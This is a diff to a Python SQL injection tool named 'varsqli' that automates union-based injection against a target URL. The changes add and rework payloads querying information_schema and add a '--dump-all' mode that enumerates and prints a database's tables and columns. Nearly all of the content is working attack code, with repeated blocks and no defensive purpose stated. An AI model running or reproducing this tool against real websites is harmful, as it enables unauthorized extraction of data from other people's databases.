@@ -1,5 +1,4 @@
-# socket denial
-# Hello Wolrd
+# Updated 
 import requests
 import argparse
 import re
@@ -379,6 +378,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
+                                                print("+-------------------------+")
                                                 print("|", tables_name)
                                                 time.sleep(0.30)
                                             print("+----------------------------+")
@@ -401,35 +401,36 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                         checking_count = requests.get(url + split_num)
                                         if str(numbers) and "::" in checking_count.text:
                                             print("[INFO] Columns Found : {}".format(numbers))
-                                            print("[INFO] Columns Found : {}".format(numbers))
-                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
                                             split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
                                             get_contents = requests.get(url + split_nums)
                                             html_contents = get_contents.text
-                                            find_checkings = r"\b\w+::\b"
+                                            find_checkings = r"\b\w+::\b\w+::\b"
                                             find_alls = re.findall(find_checkings, html_contents)
 
-                                            payload_get_tables = f"(SELECT GROUP_CONCAT(column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
                                             split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
                                             get_content = requests.get(url + split_num)
                                             html_content = get_content.text
-                                            find_checking = r"\b\w+::\b"
+                                            find_checking = r"\b\w+::\b\w+::\b"
                                             find_all = re.findall(find_checking, html_content)
                                             print(split_num)
                                             for column_dump in find_all:
-                                                columns_name = column_dump.replace("::", "")
+                                                columns_name = column_dump.replace("::", " ")
                                                 print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
                                                 time.sleep(0.30)
-                                                print()
-                                            print("+-----------------------------+")
+                                            print("+------------------------------+")
+                                            print("| Tables Name  |  Columns Name |")
+                                            print("+------------------------------+")
                                             num_tab = 0
                                             for dump in find_all:
                                                 num_tab += 1
                                                 tables_name = dump.replace("::", " ")
+                                                print("+--------------------------+")
                                                 print("|", tables_name)
                                                 time.sleep(0.30)
-                                            print("+----------------------------+")
-                                            print("Find {} Columns".format(num_tab))
+                                            print("+------------------------------+")
+                                            print("Find {} Tables and Columns".format(num_tab))
                                             print("")
                                             exit()
                                 else:
@@ -437,6 +438,115 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                             else:
                                 pass
 
+
+                            if args.dumps:
+                                if args.DB:
+                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    num = count_num
+                                    nums = [num for num in range(2, num+1)]
+                                    for numbers in nums:
+                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
+                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
+                                        checking_count = requests.get(url + split_num)
+                                        if str(numbers) and "::" in checking_count.text:
+                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
+                                            get_content = requests.get(url + split_num)
+                                            html_content = get_content.text
+                                            find_checking = r"\b\w+::\b"
+                                            find_all = re.findall(find_checking, html_content)
+                                            print(split_num)
+                                            for tables_dump in find_all:
+                                                tables_name = tables_dump.replace("::", "")
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
+                                                time.sleep(0.30)
+                                            print('+----------------------------+')
+                                            num_tab = 0
+                                            for dump in find_all:
+                                                num_tab += 1
+                                                tables_name = dump.replace("::", " ")
+                                                print("+-----------------------+")
+                                                print("|", tables_name)
+                                                time.sleep(0.30)
+
+                                            print("+----------------------------+")
+                                            print("Find {} Tables".format(num_tab))
+                                            break
+
+                                    print("[INFO] Starting Enumerate Columns name.......")
+                                    num = count_num
+                                    nums = [num for num in range(2, num+1)]
+                                    for numbers in nums:
+                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
+                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
+                                        checking_count = requests.get(url + split_num)
+                                        if str(numbers) and "::" in checking_count.text:
+                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
+                                            get_content = requests.get(url + split_num)
+                                            html_content = get_content.text
+                                            find_checking = r"\b\w+::\b"
+                                            find_all = re.findall(find_checking, html_content)
+                                            print(split_num)
+                                            for tables_dump in find_all:
+                                                tables_name = tables_dump.replace("::", "")
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
+                                                time.sleep(0.30)
+                                            print('+----------------------------+')
+                                            num_tab = 0
+                                            for dump in find_all:
+                                                num_tab += 1
+                                                tables_name = dump.replace("::", " ")
+                                                print("+-----------------------+")
+                                                print("|", tables_name)
+                                                time.sleep(0.30)
+                                            print("+----------------------------+")
+                                            print("Find {} Tables".format(num_tab))
+                                            break
+
+                                    print("[INFO] Starting Enumerate Columns and Tables name.......")
+                                    num = count_num
+                                    nums = [num for num in range(2, num+1)]
+                                    for numbers in nums:
+                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
+                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
+                                        checking_count = requests.get(url + split_num)
+                                        if str(numbers) and "::" in checking_count.text:
+                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
+                                            get_contents = requests.get(url + split_nums)
+                                            html_contents = get_contents.text
+                                            find_checkings = r"\b\w+::\b\w+::\b"
+                                            find_alls = re.findall(find_checkings, html_contents)
+
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
+                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
+                                            get_content = requests.get(url + split_num)
+                                            html_content = get_content.text
+                                            find_checking = r"\b\w+::\b\w+::\b"
+                                            find_all = re.findall(find_checking, html_content)
+                                            print(split_num)
+                                            for column_dump in find_all:
+                                                columns_name = column_dump.replace("::", " ")
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
+                                                time.sleep(0.30)
+                                                print("+------------------------------+")
+                                                print("| Tables Name  |  Columns Name |")
+                                                print("+------------------------------+")
+                                                num_tab = 0
+                                                for dump in find_all:
+                                                    num_tab += 1
+                                                    tables_name = dump.replace("::", " ")
+                                                    print("+--------------------------+")
+                                                    print("|", tables_name)
+                                                    time.sleep(0.30)
+                                                print("+------------------------------+")
+                                                print("Find {} Tables and Columns".format(num_tab))
+                                                print("")
+                                                exit()
                                 
             start_exploit()
 # ==============================================================================================================================================
@@ -528,7 +638,7 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                                                         find_data = r"\b\w+::\b"
                                                         findall_all = re.findall(find_data, html_content)
                                                         for dump in findall_all:
-                                                            dump_dbs = dump.replace("::", "\n")
+                                                            dump_dbs = dump.replace("::", "  ")
                                                             print(f"+-------------------+")
                                                             print(f"| {table_names} - {columns_name}")
                                                             print(f"+-------------------+")
@@ -628,6 +738,115 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
                             else:
                                 pass
 
+                            if args.dumps:
+                                if args.DB:
+                                    print("[INFO] Starting Enumerate Tables name.......")
+                                    num = count_num
+                                    nums = [num for num in range(2, num+1)]
+                                    for numbers in nums:
+                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
+                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
+                                        checking_count = requests.get(url + split_num)
+                                        if str(numbers) and "::" in checking_count.text:
+                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
+                                            get_content = requests.get(url + split_num)
+                                            html_content = get_content.text
+                                            find_checking = r"\b\w+::\b"
+                                            find_all = re.findall(find_checking, html_content)
+                                            print(split_num)
+                                            for tables_dump in find_all:
+                                                tables_name = tables_dump.replace("::", "")
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
+                                                time.sleep(0.30)
+                                            print('+----------------------------+')
+                                            num_tab = 0
+                                            for dump in find_all:
+                                                num_tab += 1
+                                                tables_name = dump.replace("::", " ")
+                                                print("+-----------------------+")
+                                                print("|", tables_name)
+                                                time.sleep(0.30)
+
+                                            print("+----------------------------+")
+                                            print("Find {} Tables".format(num_tab))
+                                            break
+
+                                    print("[INFO] Starting Enumerate Columns name.......")
+                                    num = count_num
+                                    nums = [num for num in range(2, num+1)]
+                                    for numbers in nums:
+                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
+                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
+                                        checking_count = requests.get(url + split_num)
+                                        if str(numbers) and "::" in checking_count.text:
+                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
+                                            get_content = requests.get(url + split_num)
+                                            html_content = get_content.text
+                                            find_checking = r"\b\w+::\b"
+                                            find_all = re.findall(find_checking, html_content)
+                                            print(split_num)
+                                            for tables_dump in find_all:
+                                                tables_name = tables_dump.replace("::", "")
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching tables name : {}".format(tables_name))
+                                                time.sleep(0.30)
+                                            print('+----------------------------+')
+                                            num_tab = 0
+                                            for dump in find_all:
+                                                num_tab += 1
+                                                tables_name = dump.replace("::", " ")
+                                                print("+-----------------------+")
+                                                print("|", tables_name)
+                                                time.sleep(0.30)
+                                            print("+----------------------------+")
+                                            print("Find {} Tables".format(num_tab))
+                                            break
+
+                                    print("[INFO] Starting Enumerate Columns and Tables name.......")
+                                    num = count_num
+                                    nums = [num for num in range(2, num+1)]
+                                    for numbers in nums:
+                                        payload_get_count = "(SELECT GROUP_CONCAT(database(),'::',version()))"
+                                        split_num = re.sub(r"\b{}\b".format(numbers), payload_get_count, payload)
+                                        checking_count = requests.get(url + split_num)
+                                        if str(numbers) and "::" in checking_count.text:
+                                            print("[INFO] Columns Found : {}".format(numbers))
+                                            payload_get_table = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.tables WHERE table_schema='{args.DB}')"
+                                            split_nums = re.sub(r"\b{}\b".format(numbers), payload_get_table, payload)
+                                            get_contents = requests.get(url + split_nums)
+                                            html_contents = get_contents.text
+                                            find_checkings = r"\b\w+::\b\w+::\b"
+                                            find_alls = re.findall(find_checkings, html_contents)
+
+                                            payload_get_tables = f"(SELECT GROUP_CONCAT(table_name,'::',column_name,'::',@@port+SEPARATOR+'<br>') FROM information_schema.columns WHERE table_schema='{args.DB}')"
+                                            split_num = re.sub(r"\b{}\b".format(numbers), payload_get_tables, payload)
+                                            get_content = requests.get(url + split_num)
+                                            html_content = get_content.text
+                                            find_checking = r"\b\w+::\b\w+::\b"
+                                            find_all = re.findall(find_checking, html_content)
+                                            print(split_num)
+                                            for column_dump in find_all:
+                                                columns_name = column_dump.replace("::", " ")
+                                                print(Fore.GREEN + Style.BRIGHT + "[INFO]" + Style.RESET_ALL + " fetching database tables on columns name : {}".format(columns_name))
+                                                time.sleep(0.30)
+                                                print("+------------------------------+")
+                                                print("| Tables Name  |  Columns Name |")
+                                                print("+------------------------------+")
+                                                num_tab = 0
+                                                for dump in find_all:
+                                                    num_tab += 1
+                                                    tables_name = dump.replace("::", " ")
+                                                    print("+--------------------------+")
+                                                    print("|", tables_name)
+                                                    time.sleep(0.30)
+                                                print("+------------------------------+")
+                                                print("Find {} Tables and Columns".format(num_tab))
+                                                print("")
+                                                exit()
+
             start_exploit_1()
     # check vuln
     else:
@@ -635,11 +854,19 @@ varsqli identified the following injection point(s) with a total of 50 HTTP(s) r
         exit()
 else:
     print("VarSQLi : python3 varsqli.py -u < url > --dbs")
+    print("")
     print("--dbs : Enumerate DBMS databases")
+    print("")
     print("--tables : Enumerate DBMS database tables")
+    print("")
     print("--columns : Enumerate DBMS database table columns")
+    print("")
     print("--dump-all : Dump All DBMS database tables and columns")
+    print("")
     print("-D : DBMS database to enumerate")
+    print("")
     print("-T : Enumerate database to enumerate tables ( ex : --dump-all -T < tables name > -C < columns name >)")
+    print("")
     print("-C : Enumerate database to enumerate table columns ( ex : --dump-all -T < tables name > -C < columns name >)")
+    print("")
     exit()
